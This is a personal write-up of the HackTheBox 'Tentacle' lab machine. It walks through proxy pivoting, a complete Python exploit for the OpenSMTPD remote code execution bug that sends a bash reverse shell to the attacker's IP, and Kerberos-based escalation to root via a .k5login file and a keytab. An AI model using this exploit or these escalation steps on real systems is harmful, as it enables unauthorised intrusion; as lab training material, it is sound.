---
title: Hackthebox Tentacle Writeup
tags:
- hackthebox
image: /images/tentacle/info.jpg
---

My first attempt at a hard box (Probably the last too...). This one had a lot of new stuff like proxychains, kerberos, SMTP RCE, host discovery and so much more. So lets dive in.

<!--more-->

<img src="/images/tentacle/info.jpg">

Starting with basic nmap.

```
nmap -T4 -Pn 10.10.10.224
PORT     STATE  SERVICE
22/tcp   open   ssh
53/tcp   open   domain
88/tcp   open   kerberos-sec
3128/tcp open   squid-http
9090/tcp closed zeus-admin
```

Hmm... we have a squid proxy, kerberos, ssh and a DNS but no web server. Alright. I browse to the squid proxy page and we can see some text with possible username and hostname.

```
Your cache administrator is j.nakazawa@realcorp.htb.
Generated Sat, 08 May 2021 06:38:01 GMT by srv01.realcorp.htb (squid/4.11)
```

Next I add the entry to my hosts file and move on. We still dont have much to work with right now. Running gobuster didn't give any results.

So I run DNSenum on the DNS server on port 53 and brute force for more subdomains. I used the subdomains-10000.txt wordlist from seclists. We get some results back.

```
Brute forcing with subdomains-10000.txt:
_________________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
```

We have two more targets now. This looks like we need to use the proxy to reach the internal network. So I added this to my hosts file and setup proxychains configuration file. This was the hard part. 

```
http 10.10.10.224
```

with the above line I kept getting access denied error to reach the other IPs. After hours of configuring and testing me and my friend came up with this configuration.

```
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
http 10.197.243.31 3128
```

We can also perform nmap port scan through the proxy with `proxychains nmap -sT -T4 10.197.243.31` 
Our target was to reach the wpad.realcorp.htb sub domain because the other one looked like just a DNS server. And since this was a http proxy we were probably looking for a web server. So we did all the testing with curl on port 80. Finally we were able to reach the port 80 on wpad.realcorp.htb. 

```
proxychains curl http://wpad.realcorp.htb/  

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.197.243.31:80-<><>-OK
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.1</center>
</body>
</html>
```

Now after some googling we find that wpad is a protocol for cache access. It has a default file named wpad.dat which we could download.

```
proxychains curl http://wpad.realcorp.htb/wpad.dat

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.197.243.31:80-<><>-OK
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

Now we had another subnet to scan. We can perform host discovery on the new subnet using nmap with proxychains again.

```
proxychains nmap -sn 10.241.251.0/24

--snip--
Host is up (5.1s latency).
Nmap scan report for 10.241.251.111
Host is up (4.9s latency).
Nmap scan report for 10.241.251.112
Host is up (5.2s latency).
Nmap scan report for 10.241.251.113
Host is up (1.7s latency).
Nmap scan report for 10.241.251.114
Host is up (5.1s latency).
Nmap scan report for 10.241.251.115
Host is up (5.0s latency).
```

This was the most irritating part of the box for me. I had to look at the latency times of the scan results to find the alive host. It can also be done by doing a an all port scan on all 255 IP addresses but that is also just as absurd.

Either way, now I have a new target `10.241.251.113` . Lets do a port scan on that IP.

```
proxychains nmap -n 10.241.251.113
--snip--
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.241.251.113:995-<--denied
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.241.251.113:554-<--denied
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.241.251.113:25-<><>-OK
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<>-10.197.243.31:3128-<><>-10.241.251.113:22-<--denied

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb
```

We have just one port open at 25 which is SMTP. I lookup for any available exploits and we get an [unauthenticated RCE!](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/). The vulnerability was basically a command chaining due to the fact that the content of mail body were being supplied to a shell command.

But we needed to make some changes to the script first. We change the host, the command to execute and finally change the MAILTO from root to j.nakazawa .

```
import socket, time
import sys
#https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
#HOST = input("what is the ip address of the host?: ")   # The remote host , gimme as raw_input
HOST="10.241.251.113"
PORT = 25              # smtp port
s = None
#writeto = input("Which file do you want to write to?: ")#raw inputen
#writewhat = input("What do you want to write to the file?: ")
payload = b"""\r\n
#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n 
#c\r\n
#d\r\n
bash -c 'bash -i >& /dev/tcp/10.10.16.6/1234 0>&1'
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
	data = s.recv(1024)
	print('Received', repr(data))
	time.sleep(1)
	print('sending')
	s.send(b"helo realcorp.htb\r\n")
	data = s.recv(1024)
	print('Received', repr(data))
	s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
	time.sleep(1)
	data = s.recv(1024)
	print('Received', repr(data))
	s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
	data = s.recv(1024)
	print('Received', repr(data))
	s.send(b"DATA\r\n")
	data = s.recv(1024)
	print('Received', repr(data))
	s.send(payload)
	data = s.recv(1024)
	print('Received', repr(data))
	s.send(b"QUIT\r\n")
	data = s.recv(1024)
	print('Received', repr(data))
print("done")
s.close()
```

Running this script with proxychains we get a shell back! But it wasn't as easy, because A lot of tinkering was needed to finally get a shell back. First I needed a to check if we had a proper RCE. To do that I gave the mail a command to ping my machine. And to check if I was being pinged I started my tcpdump and saw ping requests. (Yeah... I forgot to note all that in my notes)


```
 nc -lvp 1234
Listening on 0.0.0.0 1234
Connection received on realcorp.htb 39122
bash: cannot set terminal process group (86): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# whoami
whoami
root
root@smtp:~# hostname
hostname
smtp.realcorp.htb
```

Looks like we are already root in this machine. But this box is far from over. After some enumeration I find plain text credentials inside the home directory.

```
root@smtp:/home/j.nakazawa# cat .msmtprc
# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
```

Now I just needed to figure out where can I use them. I tried cracking some hashes I found on the machine along with the kerberos hashes I was able to get using the above creds but none of them cracked. I remember from my port scan that the box had kerberos running. I read up and find that we can use kerberos tickets to access services like ssh. For this I had to install the kerberos user package on my attack box and configure it. 

This was another major pain I faced in this box. The configurations had to be very specific, down to the upper and lower case of characters in the config file.

Finally I got a proper configuration.

```
[libdefaults]
	default_realm = REALCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true

# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]
	REALCORP.HTB = {
		kdc = REALCORP.HTB
		admin_server = REALCORP.HTB
		default_domain = REALCORP.HTB
	}
[domain_realm]
	.realcorp.htb=REALCORP.HTB
```

Next step was to request a ticket from the kerberos server. I used "kinit" for that. But Even after getting a valid ticket I wasn't able to login to ssh. After a nudge from a friend I got to know that I needed to supply a GSSAPIServer parameter to the ssh command. Also I had to uncomment any line inside my SSH client to make use of kerberos authentication.

```
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:

ssh -o GSSAPIServerIdentity=srv01.realcorp.htb j.nakazawa@realcorp.htb
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Tue May 11 05:25:41 BST 2021 from 10.10.16.6 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$
```

Finally I was able to get the user flag.

Next I saw another user "admin" which I probably had to get first before root. I ran linpeas and found a weird script running as a cronjob every second.

```
[j.nakazawa@srv01 etc]$ cat crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
```

It was running as admin, I had no doubt that I had to get admin first. Looking at the script.

```

[j.nakazawa@srv01 bin]$ ls -al
total 4
drwxr-xr-x.  2 root root   27 Nov  3  2020 .
drwxr-xr-x. 12 root root  131 Nov  3  2020 ..
-rwxr-xr--.  1 root admin 229 Dec  9 12:09 log_backup.sh

[j.nakazawa@srv01 bin]$ cat log_backup.sh 
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
[j.nakazawa@srv01 bin]$ which cd
/usr/bin/cd
[j.nakazawa@srv01 bin]$ echo $PATH
/home/j.nakazawa/.local/bin:/home/j.nakazawa/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin

```

Okay... So script is basically syncing two directories. The /var/log/squid and /home/admin. It basically writes what the squid directory had to the admin directory because it was running rsync. 

One of my first thoughts was to hijack the path of binaries. Because my user was in the path but then I got to know that cronjobs can have their own paths and also the binaries were using absolute paths, leaving no opening fot path hijack. I did try to hijack the "cd" binary though, but that didn't work because "cd" was  built in binary and does not use the PATH variable to locate it.

I tried writing my public ssh key to the .ssh folder in admin but that didn't work. After a nudge I got to know about the presence of .k5login file which basically allows any user to login as another user if they have their name inside that file and that file is located in another users home folder.

Since I was in the squid group I could write to /var/log/squid. I created a file with the content as

`j.nakazawa@REALCORP.HTB`

and saved it. After that I waited a few seconds and let the cron job run which will place this file in the admin folder for me. And I was able to SSH as admin.

[Reference](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html)

```
[j.nakazawa@srv01 ~]$ cd /var/log/squid/
[j.nakazawa@srv01 squid]$ ls
ls: cannot open directory '.': Permission denied
[j.nakazawa@srv01 squid]$ vi .k5login

ssh -o GSSAPIServerIdentity=srv01.realcorp.htb admin@realcorp.htb.htb
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu May 20 06:16:01 2021
[admin@srv01 ~]$ ls
squid_logs.tar.gz.2021-05-20-061601
[admin@srv01 ~]$ whoami
admin
[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Now I was finally admin I just needed to root. After some enumeration I found a file that wsa just readable by me. The krb5.keytab file in the /etc folder. 
I lookup what it is, and find that it basically works as a password to access other kerberos service. I list what all we can access using that file.

```
[admin@srv01 etc]$ ls -al | grep admin
-rw-r-----.  1 root admin    1403 Dec 19 06:10 krb5.keytab


[admin@srv01 etc]$ klist -kt krb5.keytab
Keytab name: FILE:krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
```

I find that these are the services that I can use using this keytab file without supplying the password. I had to read about about a lot of other kerberos stuff to find how can I use this to my advantage. I find that we can create principles/services using the kadmin, we can use ksu to switch users using kerberos as authentication mechanism. 

The only problem was I wasn't sure about how to go further. And finally after a one last nudge I was able to see what I had to do. 

Basically we can create a principle named "root" using the kadmin and set a password for that principle. After that we can use ksu to switch to root using that principle.

```
[admin@srv01 etc]$ kadmin -p kadmin/admin -kt krb5.keytab
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin with keytab krb5.keytab.
kadmin:  addprinc root
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
kadmin:  quit

[admin@srv01 etc]$ ksu root -n root@REALCORP.HTB
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 ~]# whoami
root
[root@srv01 ~]# hostname
srv01.realcorp.htb
```

And that was the story of how I rooted my first hard box. This took me 15 days to root. I wasn't at it constantly. I came back when I had an idea to test. This was a really fun box and I got to learn a ton about kerberos. 

Till next time! TaTa